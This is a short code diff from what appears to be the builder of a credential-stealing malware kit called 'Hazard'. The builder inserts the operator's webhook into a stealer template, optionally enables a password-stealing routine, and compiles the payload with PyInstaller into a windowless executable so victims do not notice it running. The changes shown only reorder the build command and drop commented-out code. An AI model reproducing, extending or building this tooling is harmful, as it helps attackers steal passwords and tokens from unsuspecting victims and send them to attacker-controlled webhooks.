@@ -4,7 +4,6 @@
 import os
 import shutil
 import Hazard
-# import PyInstaller.__main__
 
 from colorama import Fore
 
@@ -278,16 +277,9 @@ if __name__ == "__main__":
     main()
     if password_stealer:
         HazardStealer()
-""".replace("YOUR_WEBHOOK_HERE", WebHook).replace("False%", "True" if password_stealer else "False"))
+""".replace("YOUR_WEBHOOK_HERE", WebHook).replace("False%", "True" if password_stealer else "False")) #100% some way of making this better
 
-        # PyInstaller.__main__.run([
-        #     f'{fileName}.py',
-        #     '--onefile',
-        #     '--noconsole',
-        #     '--log-level=WARN',
-        #     f'-n {fileName}',
-        # ])
-        os.system(f"pyinstaller {fileName}.py --onefile --noconsole --log-level=INFO -i NONE -n {fileName}")
+        os.system(f"pyinstaller --onefile --noconsole --log-level=INFO -i NONE -n {fileName} {fileName}.py")
         shutil.move(f"{os.getcwd()}\\dist\\{fileName}.exe", f"{os.getcwd()}\\{fileName}.exe")
         shutil.rmtree('build')
         shutil.rmtree('dist')
